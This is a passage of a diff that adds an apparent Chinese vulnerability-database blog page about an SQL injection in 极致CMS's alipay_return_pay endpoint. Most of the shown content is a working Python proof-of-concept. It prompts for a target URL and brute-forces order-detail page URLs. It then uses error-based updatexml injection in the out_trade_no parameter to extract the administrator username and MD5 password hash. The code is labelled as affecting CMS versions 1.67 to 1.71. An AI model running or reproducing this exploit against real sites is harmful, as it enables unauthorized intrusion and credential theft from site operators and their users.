+</span></span></span><span class="line"><span class="cl"><span class="s2">						$new[] = [&#39;info&#39;=&gt;false,&#39;num&#39;=&gt;$d[2],&#39;tid&#39;=&gt;$d[0],&#39;id&#39;=&gt;$d[1],&#39;price&#39;=&gt;$d[3]];
+</span></span></span><span class="line"><span class="cl"><span class="s2">					}
+</span></span></span><span class="line"><span class="cl"><span class="s2">				}
+</span></span></span><span class="line"><span class="cl"><span class="s2">
+</span></span></span><span class="line"><span class="cl"><span class="s2">			}
+</span></span></span><span class="line"><span class="cl"><span class="s2">			$this-&gt;carts = $new;
+</span></span></span><span class="line"><span class="cl"><span class="s2">			$this-&gt;order = $order;
+</span></span></span><span class="line"><span class="cl"><span class="s2">			$this-&gt;display($this-&gt;template.&#39;/user/orderdetails&#39;);
+</span></span></span><span class="line"><span class="cl"><span class="s2">		}
+</span></span></span><span class="line"><span class="cl"><span class="s2">
+</span></span></span><span class="line"><span class="cl"><span class="s2">    }
+</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;&#34;&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">try</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">exploit_url</span> <span class="o">=</span> <span class="nb">str</span><span class="p">(</span><span class="nb">input</span><span class="p">(</span><span class="s2">&#34;攻击网站url：</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">        <span class="n">year_day</span>    <span class="o">=</span> <span class="nb">str</span><span class="p">(</span><span class="nb">input</span><span class="p">(</span><span class="s2">&#34;输入日期(例如:20200712):&#34;</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="n">shop</span> <span class="o">=</span> <span class="p">[]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="c1"># 遍历所有出现的用户购物车页面</span>
+</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="n">num</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">100000</span><span class="p">,</span><span class="mi">999999</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">                <span class="c1">#payload_url = &#34;user/orderdetails/orderno/No&#34; + year_day + str(num) + &#34;.html&#34;</span>
+</span></span><span class="line"><span class="cl">                <span class="n">payload_url</span> <span class="o">=</span> <span class="s2">&#34;user/orderdetails/orderno/No20200712213927.html&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">                <span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">exploit_url</span> <span class="o">+</span> <span class="n">payload_url</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">                <span class="c1"># 打印结果</span>
+</span></span><span class="line"><span class="cl">                <span class="k">if</span> <span class="s1">&#39;总金额&#39;</span> <span class="ow">in</span> <span class="n">response</span><span class="o">.</span><span class="n">text</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                        <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;购物车页面：&#39;</span><span class="p">,</span><span class="n">payload_url</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">                        <span class="n">shop</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">payload_url</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">                <span class="k">for</span> <span class="n">page</span> <span class="ow">in</span> <span class="n">shop</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                    <span class="nb">print</span><span class="p">(</span><span class="n">page</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">                    <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;------------------ peiqi -----------------------&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">except</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;出现错误&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;------------------ peiqi -----------------------&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">poc_3</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="c1">## poc_3  ---&gt; 得到账号密码  ( Home/c/MypayController.php [alipay_notify_pay])</span>
+</span></span><span class="line"><span class="cl">    <span class="c1">## 使用范围 ---&gt; 极致cms 1.71 + 1.7 + 1.67 版本</span>
+</span></span><span class="line"><span class="cl">    <span class="k">try</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">exploit_url</span> <span class="o">=</span> <span class="nb">str</span><span class="p">(</span><span class="nb">input</span><span class="p">(</span><span class="s2">&#34;攻击网站url：</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">        <span class="c1"># payload --&gt; updatexml(1,concat(0x7e,(select distinct length(concat(0x23,name,0x3a,pass,0x23)) from jz_level limit 0,1),0x7e),1)--+</span>
+</span></span><span class="line"><span class="cl">        <span class="c1"># 用户名 + 密码 长度</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="n">payload_url</span> <span class="o">=</span> <span class="n">exploit_url</span> <span class="o">+</span> <span class="s2">&#34;mypay/alipay_return_pay?out_trade_no=1%27 and updatexml(1,concat(0x7e,(select distinct length(concat(0x23,name,0x3a,pass,0x23)) from jz_level limit 0,1),0x7e),1)--+&#34;</span>
+</span></span><span class="line"><span class="cl">        <span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">payload_url</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">str_long</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="sa">r</span><span class="s1">&#39;~(.*?)~&#39;</span><span class="p">,</span><span class="n">response</span><span class="o">.</span><span class="n">text</span><span class="p">)</span><span class="o">.</span><span class="n">group</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="c1">#print(str_long)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="c1"># 得到账号密码，密码md5格式</span>
+</span></span><span class="line"><span class="cl">        <span class="n">payload_url</span> <span class="o">=</span> <span class="n">exploit_url</span> <span class="o">+</span> <span class="s2">&#34;mypay/alipay_return_pay?out_trade_no=1%27 and updatexml(1,concat(0x7e,(select distinct substring(concat(0x23,name,0x3a,pass,0x23),1,32) from jz_level limit 0,1),0x7e),1)--+&#34;</span>
+</span></span><span class="line"><span class="cl">        <span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">payload_url</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">admin_name_1</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="sa">r</span><span class="s2">&#34;~#(.*?)&#39;&#34;</span><span class="p">,</span> <span class="n">response</span><span class="o">.</span><span class="n">text</span><span class="p">)</span><span class="o">.</span><span class="n">group</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="c1">#print(admin_name_1)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="n">payload_url</span> <span class="o">=</span> <span class="n">exploit_url</span> <span class="o">+</span> <span class="s2">&#34;mypay/alipay_return_pay?out_trade_no=1%27 and updatexml(1,concat(0x7e,(select distinct substring(concat(0x23,name,0x3a,pass,0x23),32,&#34;</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">str_long</span><span class="p">)</span> <span class="o">-</span> <span class="mi">32</span><span class="p">)</span> <span class="o">+</span><span class="s2">&#34;) from jz_level limit 0,1),0x7e),1)--+&#34;</span>
+</span></span><span class="line"><span class="cl">        <span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">payload_url</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">admin_name_2</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="sa">r</span><span class="s1">&#39;~(.*?)~&#39;</span><span class="p">,</span> <span class="n">response</span><span class="o">.</span><span class="n">text</span><span class="p">)</span><span class="o">.</span><span class="n">group</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="c1">#print(admin_name_2)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="c1"># 分割账号密码</span>
+</span></span><span class="line"><span class="cl">        <span class="n">admin_passwd</span> <span class="o">=</span> <span class="n">admin_name_1</span> <span class="o">+</span> <span class="n">admin_name_2</span>
+</span></span><span class="line"><span class="cl">        <span class="n">admin_passwd</span> <span class="o">=</span> <span class="n">admin_passwd</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">&#39;:&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">admin</span> <span class="o">=</span> <span class="n">admin_passwd</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">        <span class="n">passwd</span> <span class="o">=</span> <span class="n">admin_passwd</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">        <span class="c1">#print(admin)</span>
+</span></span><span class="line"><span class="cl">        <span class="c1">#print(passwd)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;成功得到账号密码：</span><span class="se">\n</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl">              <span class="s2">&#34;用户名:&#34;</span><span class="p">,</span><span class="n">admin</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">              <span class="s2">&#34;</span><span class="se">\n</span><span class="s2">密码(md5):&#34;</span><span class="p">,</span><span class="n">passwd</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;------------------ peiqi -----------------------&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">except</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;出现错误&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;------------------ peiqi -----------------------&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">&#39;__main__&#39;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">main</span><span class="p">()</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/202202170919669.jpg"
+        data-srcset="/images/202202170919669.jpg, /images/202202170919669.jpg 1.5x, /images/202202170919669.jpg 2x"
+        data-sizes="auto"
+        alt="/images/202202170919669.jpg"
+        title="/images/202202170919669.jpg" /></p>
+</div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>Updated on 2023-12-08</span>
+            </div></div>
+        <div class="post-info-line">
+            <div class="post-info-md"><span>
+                            <a class="link-to-markdown" href="/%E6%9E%81%E8%87%B4cms-alipay_return_pay-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/index.md" target="_blank">Read Markdown</a>
+                        </span></div>
+            <div class="post-info-share">
+                <span><a href="javascript:void(0);" title="Share on Twitter" data-sharer="twitter" data-url="http://example.org/%E6%9E%81%E8%87%B4cms-alipay_return_pay-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" data-title="极致CMS alipay_return_pay SQL注入漏洞" data-via="xxxx" data-hashtags="漏洞知识库"><i class="fab fa-twitter fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="http://example.org/%E6%9E%81%E8%87%B4cms-alipay_return_pay-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" data-hashtag="漏洞知识库"><i class="fab fa-facebook-square fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Hacker News" data-sharer="hackernews" data-url="http://example.org/%E6%9E%81%E8%87%B4cms-alipay_return_pay-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" data-title="极致CMS alipay_return_pay SQL注入漏洞"><i class="fab fa-hacker-news fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Line" data-sharer="line" data-url="http://example.org/%E6%9E%81%E8%87%B4cms-alipay_return_pay-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" data-title="极致CMS alipay_return_pay SQL注入漏洞"><i data-svg-src="/lib/simple-icons/icons/line.min.svg" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on 微博" data-sharer="weibo" data-url="http://example.org/%E6%9E%81%E8%87%B4cms-alipay_return_pay-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" data-title="极致CMS alipay_return_pay SQL注入漏洞"><i class="fab fa-weibo fa-fw" aria-hidden="true"></i></a></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/%E6%BC%8F%E6%B4%9E%E7%9F%A5%E8%AF%86%E5%BA%93/">漏洞知识库</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/%E6%9E%81%E8%87%B4cms-%E5%90%8E%E5%8F%B0%E6%96%87%E4%BB%B6%E7%BC%96%E8%BE%91%E6%8F%92%E4%BB%B6-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" class="prev" rel="prev" title="极致CMS 后台文件编辑插件 任意文件上传"><i class="fas fa-angle-left fa-fw" aria-hidden="true"></i>极致CMS 后台文件编辑插件 任意文件上传</a>
+            <a href="/%E6%9E%81%E8%87%B4cms-1.81-%E5%90%8E%E5%8F%B0%E5%AD%98%E5%82%A8%E5%9E%8Bxss/" class="next" rel="next" title="极致CMS 1.81 后台存储型XSS">极致CMS 1.81 后台存储型XSS<i class="fas fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
+</div>
+</article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2023</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank">Chinchin</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
+                <i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i>
+            </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
+                <i class="fas fa-comment fa-fw" aria-hidden="true"></i>
+            </a>
+        </div><link rel="stylesheet" href="/lib/katex/katex.min.css"><link rel="stylesheet" href="/lib/katex/copy-tex.min.css"><link rel="stylesheet" href="/lib/cookieconsent/cookieconsent.min.css"><script type="text/javascript" src="/lib/autocomplete/autocomplete.min.js"></script><script type="text/javascript" src="/lib/lunr/lunr.min.js"></script><script type="text/javascript" src="/lib/lazysizes/lazysizes.min.js"></script><script type="text/javascript" src="/lib/clipboard/clipboard.min.js"></script><script type="text/javascript" src="/lib/sharer/sharer.min.js"></script><script type="text/javascript" src="/lib/typeit/index.umd.js"></script><script type="text/javascript" src="/lib/katex/katex.min.js"></script><script type="text/javascript" src="/lib/katex/auto-render.min.js"></script><script type="text/javascript" src="/lib/katex/copy-tex.min.js"></script><script type="text/javascript" src="/lib/katex/mhchem.min.js"></script><script type="text/javascript" src="/lib/cookieconsent/cookieconsent.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":50},"comment":{},"cookieconsent":{"content":{"dismiss":"Got it!","link":"Learn more","message":"This website uses Cookies to improve your experience."},"enable":true,"palette":{"button":{"background":"#f0f0f0"},"popup":{"background":"#1aa3ff"}},"theme":"edgeless"},"data":{"id-1":"首页","id-2":"首页"},"math":{"delimiters":[{"display":true,"left":"$$","right":"$$"},{"display":true,"left":"\\[","right":"\\]"},{"display":true,"left":"\\begin{equation}","right":"\\end{equation}"},{"display":true,"left":"\\begin{equation*}","right":"\\end{equation*}"},{"display":true,"left":"\\begin{align}","right":"\\end{align}"},{"display":true,"left":"\\begin{align*}","right":"\\end{align*}"},{"display":true,"left":"\\begin{alignat}","right":"\\end{alignat}"},{"display":true,"left":"\\begin{alignat*}","right":"\\end{alignat*}"},{"display":true,"left":"\\begin{gather}","right":"\\end{gather}"},{"display":true,"left":"\\begin{CD}","right":"\\end{CD}"},{"display":false,"left":"$","right":"$"},{"display":false,"left":"\\(","right":"\\)"}],"strict":false},"search":{"highlightTag":"em","lunrIndexURL":"/index.json","maxResultLength":10,"noResultsFound":"No results found","snippetLength":50,"type":"lunr"},"typeit":{"cursorChar":"|","cursorSpeed":1000,"data":{"id-1":["id-1"],"id-2":["id-2"]},"duration":-1,"speed":100}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
+</html>
